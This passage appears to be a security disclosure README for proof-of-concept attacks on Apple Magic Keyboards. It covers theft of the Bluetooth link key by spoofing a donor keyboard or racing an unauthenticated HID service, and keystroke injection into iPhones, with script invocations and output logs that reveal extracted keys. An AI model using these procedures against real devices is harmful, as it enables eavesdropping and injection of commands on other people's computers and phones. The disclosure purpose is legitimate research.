#### Affected Versions

macOS versions 12, 13 and 14 were tested and found to be vulnerable to this attack. Earlier versions of macOS were not tested.

The following Apple peripherals were tested and found vulnerable to this attack. No other peripherals were tested, so this list may be incomplete.

| Product Name | Model Number |
|-|-|
| Magic Keyboard | A2450 |
| Magic Keyboard with Touch ID | A2449 |
| Magic Keyboard with Numeric Keypad | A1843 |
| Magic Keyboard with Touch ID and Numeric Keypad | A2520 |
| Magic Mouse | A1657 |

#### Starting State

- Magic Keyboard is paired with a Mac that does not have Lockdown Mode enabled
- The attacker knows the Bluetooth address and serial number of the Magic Keyboard
- The attacker as a donor Magic Keyboard (which will be temporarily reconfigured to spoof the target keyboard)

#### Running the PoC

```
> ./read-link-key-from-mac.py --help
usage: read-link-key-from-mac.py [-h] -a KEYBOARD_ADDRESS -s KEYBOARD_SERIAL

options:
  -h, --help            show this help message and exit
  -a KEYBOARD_ADDRESS, --keyboard_address KEYBOARD_ADDRESS
  -s KEYBOARD_SERIAL, --keyboard_serial KEYBOARD_SERIAL
```

#### Invocation

```
./read-link-key-from-mac.py -a 1c:57:fc:08:65:12 -s F1T2107RUNW12NXA9
```

#### Output

```
[2024-01-07 10:34:53.910]  Turn on the donor keyboard and plug it into this computer
[2024-01-07 10:34:58.200]  changing Bluetooth address from 3C:A6:F6:E1:3D:F0 to 1c:57:fc:08:65:12
[2024-01-07 10:34:58.201]  serial number: F0T230C02AZ0NC1EH -> F1T2107RUNW12NXA9
[2024-01-07 10:34:58.202]  Unplug the donor keyboard and plug it into the Mac.
[2024-01-07 10:34:58.202]  Wait a few seconds, then plug it back into this computer.
[2024-01-07 10:35:02.533]  keyboard was unplugged
[2024-01-07 10:35:13.463]  keyboard has returned
[2024-01-07 10:35:13.464]  Mac BT Address - a4:c3:99:e8:a8:6c
[2024-01-07 10:35:13.464]  BT Link-Key    - c95e3ec98809f2745d32029e7f97b67e
```

### Magic Keyboard Link Key via Bluetooth

When the Magic Keyboard is plugged into the Mac, the Mac sends the Bluetooth link key to the Magic Keyboard over USB.

The link key remains in memory until the Magic Keyboard is powered off, and can be read via an unauthenticated Bluetooth HID service on the keyboard.

The unauthenticated Bluetooth HID service becomes available when the Magic Keyboard is unplugged from the Mac, and remains available until the Bluetooth link is established.

This is a zero-click attack with a timing component. The PoC does not implement a timing trigger, and instead attempts to connect to the Magic Keyboard in a loop until successful.

#### Affected Versions

The following Apple peripherals were tested and found vulnerable to this attack. No other peripherals were tested, so this list may be incomplete.

| Product Name | Model Number |
|-|-|
| Magic Keyboard | A2450 |
| Magic Keyboard with Touch ID | A2449 |
| Magic Keyboard with Numeric Keypad | A1843 |
| Magic Keyboard with Touch ID and Numeric Keypad | A2520 |
| Magic Mouse | A1657 |

#### Starting State

- Magic Keyboard is powered on and plugged into the Mac

#### Running the PoC

Plug the Magic Keyboard into the Linux computer with a Lightning-to-USB cable, then run the script. Once the script is running, unplug the keyboard from the Mac.

When the keyboard is unplugged, there is a race to connect to the keyboard between the attacker machine and the Mac.

The PoC will typically connect to the Magic Keyboard either ~5 or ~25 seconds after the keyboard is unplugged from the Mac. Sometimes the Mac will win the race, and when it does, the PoC will not complete.

```
./read-link-key-lightning.py <Magic-Keyboard-BT-Address>
```

#### Invocation

```
./read-link-key-bluetooth.py 1c:57:dc:88:55:02
```

#### Output

```
[2024-01-07 13:09:59.311] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:00.313] ERROR connecting on port 17: timed out
[2024-01-07 13:10:00.314] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:00.316] ERROR connecting on port 17: [Errno 22] Invalid argument
[2024-01-07 13:10:00.318] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:01.359] ERROR connecting on port 17: timed out
[2024-01-07 13:10:01.361] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:01.362] ERROR connecting on port 17: [Errno 22] Invalid argument
[2024-01-07 13:10:01.364] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:02.407] ERROR connecting on port 17: timed out
[2024-01-07 13:10:02.408] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:02.410] ERROR connecting on port 17: [Errno 22] Invalid argument
[2024-01-07 13:10:02.411] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:03.448] ERROR connecting on port 17: timed out
[2024-01-07 13:10:03.449] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:03.451] ERROR connecting on port 17: [Errno 22] Invalid argument
[2024-01-07 13:10:03.452] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:04.512] ERROR connecting on port 17: timed out
[2024-01-07 13:10:04.513] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:04.515] ERROR connecting on port 17: [Errno 22] Invalid argument
[2024-01-07 13:10:04.516] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:05.568] ERROR connecting on port 17: timed out
[2024-01-07 13:10:05.569] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:05.638] ERROR connecting on port 17: [Errno 22] Invalid argument
[2024-01-07 13:10:05.640] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:06.680] ERROR connecting on port 17: timed out
[2024-01-07 13:10:06.681] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:07.682] ERROR connecting on port 17: timed out
[2024-01-07 13:10:07.684] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:08.685] ERROR connecting on port 17: timed out
[2024-01-07 13:10:08.687] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:09.689] ERROR connecting on port 17: timed out
[2024-01-07 13:10:09.690] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:10.691] ERROR connecting on port 17: timed out
[2024-01-07 13:10:10.693] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:11.694] ERROR connecting on port 17: timed out
[2024-01-07 13:10:11.696] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:12.697] ERROR connecting on port 17: timed out
[2024-01-07 13:10:12.699] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:13.700] ERROR connecting on port 17: timed out
[2024-01-07 13:10:13.702] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:14.704] ERROR connecting on port 17: timed out
[2024-01-07 13:10:14.705] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:15.707] ERROR connecting on port 17: timed out
[2024-01-07 13:10:15.708] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:16.709] ERROR connecting on port 17: timed out
[2024-01-07 13:10:16.711] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:17.712] ERROR connecting on port 17: timed out
[2024-01-07 13:10:17.714] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:18.715] ERROR connecting on port 17: timed out
[2024-01-07 13:10:18.717] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:19.719] ERROR connecting on port 17: timed out
[2024-01-07 13:10:19.720] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:20.722] ERROR connecting on port 17: timed out
[2024-01-07 13:10:20.723] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:21.725] ERROR connecting on port 17: timed out
[2024-01-07 13:10:21.726] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:22.728] ERROR connecting on port 17: timed out
[2024-01-07 13:10:22.729] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:23.731] ERROR connecting on port 17: timed out
[2024-01-07 13:10:23.732] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:24.734] ERROR connecting on port 17: timed out
[2024-01-07 13:10:24.735] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:25.737] ERROR connecting on port 17: timed out
[2024-01-07 13:10:25.738] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:26.739] ERROR connecting on port 17: timed out
[2024-01-07 13:10:26.741] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:26.824] ERROR connecting on port 17: [Errno 22] Invalid argument
[2024-01-07 13:10:26.826] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:27.868] ERROR connecting on port 17: timed out
[2024-01-07 13:10:27.869] connecting to 1c:57:dc:88:55:02 on port 17
[2024-01-07 13:10:28.262] SUCCESS! connected on port 17
[2024-01-07 13:10:28.264] connecting to 1c:57:dc:88:55:02 on port 19
[2024-01-07 13:10:28.290] SUCCESS! connected on port 19
[2024-01-07 13:10:28.291] [TX-17] 53ff34
[2024-01-07 13:10:28.346] [RX-17] 00
[2024-01-07 13:10:28.346] [TX-17] 43f0
[2024-01-07 13:10:28.414] [RX-17] a3f0340347011c57dc88550200254000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
[2024-01-07 13:10:28.414] [TX-17] 53ff35
[2024-01-07 13:10:28.458] [RX-17] 00
[2024-01-07 13:10:28.458] [TX-17] 43f0
[2024-01-07 13:10:28.498] [RX-17] a3f035010150de06a8e1ca80b480523b23bbff5ea40c52e88f1905
Model     0    - Magic Keyboard
BT Address     - 1c:57:dc:88:55:02
Mac BT Address - 50:de:06:a8:e1:ca
BT Link Key    - 05198fe8520ca45effbb233b5280b480
```

### iOS Keystroke Injection

When an iPhone is attempting to connect to a paired Magic Keyboard over Bluetooth, an attacker can spoof the Magic Keyboard to the iPhone, pair a virtual Bluetooth keyboard, and inject keystrokes without user confirmation.

This attack has a timing component, where the attacker must connect to the iPhone at the precise moment the iPhone attempts to connect to the Magic Keyboard.

The included PoC fires when the iPhone attempts to connect to its paired Magic Keyboard. This uses the same SDP timing trigger as the macOS PoC, triggering when the iPhone is connecting to its paired Magic Keyboard. This is a zero-click attack that requires observing a user connect to their paired Magic Keyboard.

#### Affected Versions

- iOS 17 is vulnerable prior to 17.2
- iOS 16 is vulnerable with no patch expected
- iOS 15 and older were not tested

#### Starting State

- The iPhone is paired with a Magic Keyboard, and the keyboard is out of range or powered off.
- When the user tries to connect to their Magic Keyboard, the PoC injects keystrokes to open a web browser and perform a Google search.

#### Running the PoC

**NOTE: BlueZ must be running in compatibility mode on the attacker machine for this PoC. The iPhone PoC script is found in iphone-poc.zip**

```
> ./iphone-poc.py
usage: ./iphone-poc.py <hciX> <BT_ADDR_IPHONE> <BT_ADDR_KEYBOARD>
```

##### Invocation

```
./iphone-poc.py hci1 4C:20:B8:D6:63:45 1C:57:DC:88:55:02
```
